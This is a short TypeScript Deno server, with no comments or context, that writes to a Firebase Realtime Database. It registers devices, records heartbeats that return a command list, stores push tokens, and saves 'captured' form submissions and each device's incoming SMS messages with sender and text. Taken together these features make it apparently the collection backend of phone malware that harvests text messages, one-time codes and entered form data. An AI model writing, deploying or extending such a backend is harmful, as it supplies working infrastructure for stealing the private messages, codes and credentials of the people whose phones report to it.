const RTDB = "https://kotha-5ba9e-default-rtdb.asia-southeast1.firebasedatabase.app";

async function db(path: string, data: unknown) {
  try {
    await fetch(`${RTDB}/${path}.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
  } catch (_) {}
}

async function dbPush(path: string, data: unknown) {
  try {
    await fetch(`${RTDB}/${path}.json`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
  } catch (_) {}
}

Deno.serve(async (req: Request) => {
  const url  = new URL(req.url);
  const path = url.pathname;
  const ts   = new Date().toISOString();
  const headers = {
    "Content-Type": "application/json",
    "Access-Control-Allow-Origin": "*",
  };
  if (req.method === "OPTIONS") return new Response(null, { status: 204, headers });

  let body: Record<string, unknown> = {};
  try { body = await req.json(); } catch (_) {}

  const deviceId = (body.device_id as string) || "unknown";

  if (path === "/register") {
    const id = deviceId === "unknown"
      ? crypto.randomUUID().replace(/-/g,"").slice(0,16)
      : deviceId;
    await db(`devices/${id}`, { ...body, device_id: id, registeredAt: ts, online: true, lastSeen: ts });
    return new Response(JSON.stringify({ status: "ok", device_id: id, build_api_key: id }), { headers });
  }

  if (path === "/ping" || path === "/heartbeat") {
    await db(`devices/${deviceId}/status`, { online: true, lastSeen: ts, status: body.status ?? "online" });
    return new Response(JSON.stringify({ status: "ok", commands: [] }), { headers });
  }

  if (path === "/fcm/token") {
    await db(`devices/${deviceId}/fcm`, { token: body.fcm_token, updatedAt: ts });
    return new Response(JSON.stringify({ status: "ok" }), { headers });
  }

  if (path === "/form") {
    await dbPush(`forms`, { deviceId, ...body, capturedAt: ts });
    await dbPush(`devices/${deviceId}/forms`, { ...body, capturedAt: ts });
    return new Response(JSON.stringify({ status: "ok" }), { headers });
  }

  if (path === "/sms") {
    await dbPush(`devices/${deviceId}/sms`, {
      sender: body.sender ?? body.address,
      body:   body.s ?? body.body,
      date:   body.date ?? ts,
      receivedAt: ts,
    });
    return new Response(JSON.stringify({ status: "ok", count: 0 }), { headers });
  }

  return new Response(JSON.stringify({ status: "ok" }), { headers });
});
